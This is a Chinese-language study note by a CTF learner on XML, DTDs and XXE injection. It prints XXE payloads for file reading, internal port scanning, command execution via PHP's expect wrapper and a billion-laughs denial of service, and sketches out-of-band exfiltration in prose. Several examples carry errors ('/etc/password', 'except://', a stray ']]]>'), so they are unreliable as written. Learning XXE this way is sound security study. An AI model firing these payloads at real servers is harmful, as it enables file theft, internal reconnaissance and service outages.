# **XXE学习**

---

>~~极客的XXE题真的给我整懵了~~<br>
整好面试结束了也能不用忙着赶进度了~~(真实)~~

## **XML学习**

### **XML介绍**

XXE怎么说也是基于XML的嘛，先对XML做一个大致学习。

>XML是指*可扩展标记语言*（Extensible Markup Language）用于传输和存储数据。XML的标签及内容允许作者自己定义，是独立于软件和硬件信息传输工具。<br>

>而同为标记语言的HTML则是用来显示数据

XML 应用于 web 开发的许多方面，常用于简化数据的存储和共享。<br>
比如一个个人博客，总不能每次需要添加文章的时候都去修改html源文件吧。为了实现动态显示，可以通过js脚本去读取外部XML文件以达到更新网页的目的。所以说用XML进行数据传输是非常方便的，这也就是为什么网站要用XML传输数据的原因
###  **XML的语法规则**

- XML 文档必须有一个根元素
- XML 元素都必须有一个关闭标签
- XML 标签对大小敏感
- XML 元素必须被正确的嵌套
- XML 属性值必须加引导
<br>


```
<?xml version="1.0" encoding="UTF-8" >  <!--XML 声明-->
<girl age="18">　　<!--自定的根元素girl;age属性需要加引导-->
<hair>长头发</hair>　　<!--自定义的4个子元素，即girl对象的属性-->
<eye>大眼睛</eye>
<face>可爱的脸庞</face>
<summary>可爱美丽的女孩</summary>
</girl>　　<!--根元素的闭合-->
```

结构即为上面所示<br>
第一行是XML声明，定义了XML的版本和所用的编码<br>
`<?xml version="1.0" encoding="UTF-8" >`<br>
下一行是根元素<br>
`<girl age="18">`<br>
再下方就是子元素<br>
`<eye>大眼睛</eye>`<br>
`<face>可爱的脸庞</face>`<br>
`<summary>可爱美丽的女孩</summary>`<br>
最后一行定义根元素的结尾<br>
`</girl>`<br>

一些字符的实体引用
- `&lt;` = <
- `&gt` = >
- `&amp` = &
- `&quot` = "
- `&apos` = '
### **DTD的使用**

DTD(文档类型定义)的作用是定义XML文档的的合法构建模块，它使用一系列的合法元素来定义文档结构，可以被成行的声明于XML文档中，也可做为一个外部引用。直接引用一个例子，如:
```
<!--XML声明-->
<?xml version="1.0"?> 
<!--文档类型定义-->
<!DOCTYPE note [  　　<!--定义此文档是 note 类型的文档-->
<!ELEMENT note (to,from,heading,body)>  <!--定义note元素有四个元素-->
<!ELEMENT to (#PCDATA)>     <!--定义to元素为”#PCDATA”类型-->
<!ELEMENT from (#PCDATA)>   <!--定义from元素为”#PCDATA”类型-->
<!ELEMENT head (#PCDATA)>   <!--定义head元素为”#PCDATA”类型-->
<!ELEMENT body (#PCDATA)>   <!--定义body元素为”#PCDATA”类型-->
]]]>
<!--文档元素-->
<note>
<to>Dave</to>
<from>Tom</from>
<head>Reminder</head>
<body>You are a good man</body>
</note>
```

以上 DTD 解释如下：

- !DOCTYPE note (第二行)定义此文档是 note 类型的文档。

- !ELEMENT note (第三行)定义 note 元素有四个元素："to、from、heading,、body"

- !ELEMENT to (第四行)定义 to 元素为 "#PCDATA" 类型

- !ELEMENT from (第五行)定义 from 元素为 "#PCDATA" 类型

- !ELEMENT heading (第六行)定义 heading 元素为 "#PCDATA" 类型

- !ELEMENT body (第七行)定义 body 元素为 "#PCDATA" 类型


`<!DOCTYPE 根元素 [元素声明]>`
为内部的DOCTYPE声明<br>
`<!DOCTYPE 根元素 SYSTEM "文件名">`
为外部文档声明<br>
如果DTD在XML文档内部，则使用内部声明。如在外部，则需要使用外部声明进行包含

`<!ELEMENT 元素名称 类别>`
或
`<!ELEMENT 元素名称 (元素内容)>`为元素声明

PCDATA的意思是被解析的字符数据。

声明规则是

- 空元素通过类别关键字EMPTY进行声明<br>
`<!ELEMENT 元素名称 EMPTY>`
- 只有PCDATA的元素用(#PCDATA)进行声明<br>
`<!ELEMENT 元素名称 (#PCDATA)>`
- 带有任何内容的元素通过ANY进行声明<br>
`<!ELEMENT 元素名称 ANY>`
- 带有子元素的元素通过圆括号中子元素进行声明，子元素必须按照主元素声明中的顺序出现，且子元素也必须被声明，子元素也可以拥有子元素。<br>
`<!ELEMENT 元素名称 (子元素名称 1,子元素名称 2,.....)>`
- 声明只出现一次的元素
`<!ELEMENT 元素名称 (子元素名称)>`
- 声明最少出现一次的元素
`<!ELEMENT 元素名称 (子元素名称+)>`
- 声明出现零次或多次的元素
`<!ELEMENT 元素名称 (子元素名称*)>`
- 声明出现零次或一次的元素
`<!ELEMENT 元素名称 (子元素名称?)>`
- 声明非什么即什么的类容，即以下例子主元素中需要出现message或者body中的一个
`<!ELEMENT 元素名称 (to,from,header,(message|body))>`
- 声明混合型内容，和上面一条类似
`<!ELEMENT 元素名称 (#PCDATA|to|from|header|message)*>`

## **XXE攻击**

### **XXE攻击思路及实例**

XXE的攻击思路主要是利用DTD用用外部实体导致的漏洞，譬如任意文件读取。
```
<?xml version="1.0"?>
<!DOCTYPE hack [
<!ENTITY xxe SYSTEM "file:///etc/password">
]>

<hack>&xxe;</hack>
```
这段代码即是将 ***file:///etc/password*** 的内容赋值给外部实体xxe<br>
如果`<hack>`标签能够回显，则会显示 ***file:///etc/password*** 中的内容。

又譬如内网扫描
```
<?xml version="1.0"?>
<!DOCTYPE hack [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80">
]>

<hack>&xxe;</hack>
```
这段代码是利用返回的报错信息去判断是否xml获取了相关的数据流，以此判断该端口是否开放。

在对方php安装了expect扩展的情况下，还可以进行命令执行，具体代码如下
```
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "except://ls">
]>
<x>&f;</x>
```
这段代码是利用expect扩展进行命令执行。原理还没了解过...先搁这儿放着

再比如DDOS
```
<?xml version="1.0"?>
 <!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
 ]>
 <lolz>&lol9;</lolz>
```
上述代码是在内存中生成十亿个"lol"的ddos攻击。(也没有复现...怕炸- -)

当没有回显时，还可通过构建带外通道oob，将回显结果回显在自己服务器下。<br>
原理有点懵，也没复现成功...就大致讲下流程，问完师傅再来补充<br>
通过xxe注入，从自己服务器下读取恶意dtd文件，然后执行dtd文件中payload读取想要读取的文件，再带着回显内容返回自己服务器下，完成攻击。

